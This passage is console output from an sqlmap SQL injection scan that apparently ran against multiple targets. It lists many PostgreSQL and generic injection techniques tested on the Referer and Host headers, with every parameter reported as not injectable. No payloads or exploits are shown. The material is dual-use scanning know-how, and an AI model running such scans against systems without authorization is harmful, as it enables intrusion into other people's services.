[15:33:25] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[15:33:26] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[15:33:26] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[15:33:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:34:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[15:35:04] [WARNING] parameter 'Referer' does not seem to be injectable
[15:35:04] [INFO] testing if parameter 'Host' is dynamic
[15:35:04] [WARNING] parameter 'Host' does not appear to be dynamic
[15:35:04] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[15:35:05] [INFO] testing for SQL injection on parameter 'Host'
[15:35:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:36:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:36:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:38:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:38:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[15:39:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[15:39:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[15:39:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[15:39:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:39:52] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[15:39:53] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[15:39:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[15:39:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[15:39:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[15:40:31] [INFO] testing 'Generic inline queries'
[15:40:32] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:41:12] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[15:41:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[15:41:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[15:41:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[15:41:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[15:41:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[15:41:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[15:41:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[15:41:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[15:42:23] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[15:43:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:43:35] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[15:43:56] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[15:43:57] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[15:43:57] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[15:43:58] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[15:43:58] [INFO] testing 'PostgreSQL inline queries'
[15:43:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:44:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[15:44:35] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[15:44:50] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[15:45:04] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[15:45:18] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[15:45:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:46:09] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[15:46:33] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[15:46:51] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[15:47:23] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[15:48:01] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[15:48:25] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[15:48:57] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[15:49:19] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[15:49:27] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[15:49:27] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[15:49:28] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[15:49:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:49:54] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[15:50:13] [WARNING] parameter 'Host' does not seem to be injectable
[15:50:13] [ERROR] all tested parameters do not appear to be injectable, skipping to the next target
[15:50:13] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3136 times, 400 (Bad Request) - 1542 times
[15:50:13] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\burak\AppData\Local\sqlmap\output\results-08262022_0508am.csv'

[*] ending @ 15:50:13 /2022-08-26/